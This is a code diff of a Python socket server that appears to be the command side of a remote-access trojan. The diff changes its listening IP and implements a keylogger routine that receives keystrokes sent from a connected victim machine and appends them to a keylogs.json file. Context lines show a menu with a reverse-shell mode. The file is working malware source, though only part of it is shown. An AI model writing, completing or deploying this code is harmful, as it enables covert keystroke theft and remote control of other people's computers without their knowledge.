@@ -7,7 +7,7 @@ import pyautogui
 class Server:
 #server code starts here
     def __init__(self):
-        self.host = "172.17.105.160"
+        self.host = "192.168.43.150"
         self.port = 9090
         self.route = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     def binding(self):#binding ip to port
@@ -66,7 +66,6 @@ class Server:
                 self.test = "2".encode("utf-8")
                 self.channel.send(self.test)
                 self.keylogger()
-                pass
             if self.choice == 3:
                 #screen reverse shell goes here
                 print("REVERSE SHELL MODE ACTIVATED")
@@ -112,8 +111,13 @@ class Server:
 
     #keylogger codes goes here 
     def keylogger(self):
-        
-        pass
+        while True:
+            self.key = self.channel.recv(1024).decode("utf-8")
+            if not self.key or self.key == "END":
+                break
+            print(self.key)
+            with open("keylogs.json", "a") as self.file:
+                self.file.write(f"{self.key[3:]} ")
 
     #screen reverse shell goes here
     def reverse_shell(self):
